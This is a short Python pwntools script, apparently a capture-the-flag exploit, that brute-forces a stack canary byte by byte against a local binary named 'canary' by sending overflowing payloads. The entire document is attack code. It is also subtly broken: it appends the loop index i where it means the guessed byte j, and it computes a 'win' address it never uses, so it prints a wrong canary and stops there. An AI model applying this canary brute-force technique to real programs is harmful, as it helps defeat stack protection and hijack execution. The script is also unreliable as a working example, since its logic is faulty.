
from pwn import *
import struct

sh = process('./canary')
proc = ELF('./canary')

win_addr = int(hex(proc.symbols['win']), 16)

canary = ''
raw_input()
#Need to determine what the canary is
for i in range(4):
        for j in range(0x100):
                sh = process('./canary')
                payload = 'A'*0x20
                payload += canary + chr(j)
                sh.recvuntil('> ')
                sh.sendline(str(len(payload)))
                sh.recvuntil('> ')
                sh.sendline(payload)
                if('Flag' in sh.recvuntil('\n')):
                        canary += chr(i)
                        sh.close()
                        break
                sh.close()
print(canary)

